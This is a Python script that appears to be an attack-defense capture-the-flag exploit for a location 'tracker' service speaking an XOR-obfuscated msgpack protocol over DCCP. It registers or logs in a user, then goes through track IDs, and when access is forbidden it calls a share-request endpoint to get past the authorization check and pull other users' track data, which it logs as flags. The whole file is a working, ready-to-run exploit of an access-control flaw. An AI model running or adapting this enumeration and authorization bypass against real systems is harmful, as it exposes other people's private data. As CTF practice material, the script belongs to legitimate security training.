#!/usr/bin/env python3
import argparse
import hashlib
import hmac
import logging
import random
import string

import msgpack
import base64
import socket

BUFFER_SIZE = 1024

HMAC_PASS_KEY = "GIa82fy_K_qpOdpSQfQSDw"

SOCK_DCCP = 6
IPROTO_DCCP = 33
SOL_DCCP = 269
DCCP_SOCKOPT_SERVICE = 2


class Request:
    USER_REGISTER = 0x00
    USER_LOGIN = 0x01
    USER_LOGOUT = 0x02
    USER_DELETE = 0x03
    TRACKER_LIST = 0x10
    TRACKER_ADD = 0x11
    TRACKER_DELETE = 0x12
    POINT_ADD = 0x20
    POINT_ADD_BATCH = 0x21
    TRACK_LIST = 0x30
    TRACK_GET = 0x31
    TRACK_DELETE = 0x32
    TRACK_REQUEST_SHARE = 0x33
    TRACK_SHARE = 0x34


class Response:
    OK = 0x00
    BAD_REQUEST = 0x01
    FORBIDDEN = 0x02
    NOT_FOUND = 0x03
    INTERNAL_ERROR = 0x04
    @staticmethod
    def to_str(value):
        return {
            Response.OK: "OK",
            Response.BAD_REQUEST: "BAD_REQUEST",
            Response.FORBIDDEN: "FORBIDDEN",
            Response.NOT_FOUND: "NOT_FOUND",
            Response.INTERNAL_ERROR: "INTERNAL_ERROR"
        }.get(value, str(value))


class Client:
    def __init__(self, host="127.0.0.1", port=9090):
        sock = socket.socket(socket.AF_INET, SOCK_DCCP, IPROTO_DCCP)
        sock.setsockopt(SOL_DCCP, DCCP_SOCKOPT_SERVICE, True)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.connect((host, port))
        self.sock = sock
        self.key = self.receive_key()

    def query(self, *args, expect=None):
        response = self.query_raw(args)
        status = response[0]
        if expect is not None:
            if status != expect:
                logging.error("Bad response status: %r, expected: %r.",
                              Response.to_str(response[0]),
                              Response.to_str(expect))
                raise AssertionError()
            response = response[1:]
        return response[0] if len(response) == 1 else response

    def receive_key(self):
        key_raw = self.sock.recv(BUFFER_SIZE)
        if len(key_raw) != 1:
            raise Exception("Unexpected key size")
        return key_raw[0]

    def query_raw(self, obj):
        raw_bytes = msgpack.packb(obj)
        raw_bytes = bytes(b ^ ((self.key + i) & 0xFF) for i, b in enumerate(raw_bytes))
        self.sock.send(raw_bytes)
        return msgpack.unpackb(self.sock.recv(BUFFER_SIZE), raw=False)


def create_login(length=16):
    letters = string.ascii_lowercase
    return "".join(random.choice(letters) for _ in range(length))


def create_password(login):
    pass_bytes = hmac.new(HMAC_PASS_KEY.encode(), msg=login.encode(), digestmod=hashlib.sha384).digest()
    return base64.b64encode(pass_bytes).decode()


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--start", type=int, default=1)
    parser.add_argument("--end", type=int, default=999)
    parser.add_argument("--login")
    parser.add_argument("--password")
    return parser.parse_args()


def try_get(client, secret, track_id):
    response = client.query(Request.TRACK_GET, secret, track_id)
    logging.debug("  response: %s", response)

    if isinstance(response, list):  # success!
        points = response[1]
        retrieved_flag = "".join([meta for ts, lat, lon, meta in points])
        return response[0], retrieved_flag

    return response, None


def try_hack(client, secret, track_id):
    client.query(Request.TRACK_REQUEST_SHARE, secret, track_id)


def main():
    logging.basicConfig(format="%(asctime)-15s %(message)s", level=logging.INFO)

    args = parse_args()

    logging.info("Trying to exploit 'tracker' at %r", args.host)
    client = Client(args.host)

    if args.login is None:
        login = create_login()
        password = create_password(login)

        logging.info("Registering user: %r, pass: %r", login, password)
        client.query(Request.USER_REGISTER, login, password, expect=Response.OK)
    else:
        login = args.login
        password = args.password

    logging.info("Logging in as %r", login)
    secret = client.query(Request.USER_LOGIN, login, password, expect=Response.OK)

    flags_count = 0

    logging.info("Reading tracks")
    for track_id in range(args.start, args.end+1):
        logging.info("  track #%d ... ", track_id)
        status, flag = try_get(client, secret, track_id)

        if flag is not None:
            logging.info("  => flag: %s", flag)
            flags_count += 1
            continue

        if status == Response.FORBIDDEN:
            logging.info("  %s, trying to hack", Response.to_str(status))

            try_hack(client, secret, track_id)
            status, flag = try_get(client, secret, track_id)
            if flag is not None:
                logging.info("  => flag: %s", flag)
                flags_count += 1
                continue

            logging.info("  hack FAILED!")
            break
        logging.info("  => %s", Response.to_str(status))
        #if status == Response.NOT_FOUND:
        #    break

    logging.info("Found %d flags", flags_count)


if __name__ == "__main__":
    main()
